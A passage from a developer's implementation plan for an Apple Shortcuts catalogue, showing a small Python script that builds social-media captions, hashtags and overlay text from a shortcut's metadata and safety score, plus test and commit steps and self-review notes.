Expected: FAIL with `ModuleNotFoundError: No module named 'scripts.reelkit'`

- [ ] **Step 3: Implement reelkit.py**

`scripts/reelkit.py`:
```python
"""Turn a shortcut entry (meta + scan) into a ready-to-post short-form video kit:
caption, hashtags, and a 3-beat on-screen text overlay. Pure text — no APIs, no posting."""
import json
import sys
from pathlib import Path

import yaml

BADGE = {"green": "🟢", "yellow": "🟡", "red": "🔴"}
ROOT = Path(__file__).parents[1]


def build_kit(entry):
    s = entry["scan"]
    badge = BADGE[s["badge"]]
    caption = (
        f"Stop downloading an app for this. 📱 {entry['name']} — {entry['description']}\n\n"
        f"{badge} Safety score: {s['score']}/100 (we scan every shortcut so you don't get a virus).\n"
        f"One tap to install — link in bio 👆 {entry['source']}"
    )
    hashtags = [
        "#shortcuts", "#appleshortcuts", "#iphonetips", "#ios",
        f"#{entry['category'].lower().replace(' ', '')}", "#iphonehacks", "#productivity",
    ]
    overlay = [
        "POV: you stop paying for an app that does THIS 👇",
        f"{entry['name']}: {entry['description']}",
        f"{badge} {s['score']}/100 safe • one tap to install • link in bio",
    ]
    return {"caption": caption, "hashtags": hashtags, "overlay": overlay}


def _load_entry(slug):  # pragma: no cover - filesystem glue
    d = ROOT / "shortcuts" / slug
    entry = yaml.safe_load((d / "meta.yml").read_text())
    entry["scan"] = json.loads((d / "scan.json").read_text())
    return entry


if __name__ == "__main__":  # pragma: no cover - CLI glue
    print(json.dumps(build_kit(_load_entry(sys.argv[1])), ensure_ascii=False, indent=2))
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_reelkit.py -v`
Expected: 3 passed.

- [ ] **Step 5: Commit**

```bash
git add scripts/reelkit.py tests/test_reelkit.py
git commit -m "feat: add reelkit content-kit generator (caption/hashtags/overlay)"
```

---

## Self-Review Notes

- **Spec coverage:** §3 decompile → Tasks 2,6; §4 structure → Tasks 1,9,10,11; §5 scanner → Tasks 4,5; §6 contributor flow → Tasks 8,10,11; §7 virality → Tasks 7,11,12; §8 error handling → Tasks 5 (unknown=yellow), 8 (fail on red); §9 testing → Tasks 3,5,6,7,8; §0 Why-Shortcuts → Task 11. All covered.
- **Network isolation:** the only network code (`fetch_unsigned_plist`) is `# pragma: no cover` and excluded from CI via `-m "not network"`; its JSON key path is gated on the Task 2 validation result.
- **Type consistency:** scan result dict shape `{score, tier, badge, findings:[{id,tier,weight,reason}]}` is identical across scan.py, vet_pr.py, and build_readme.py.
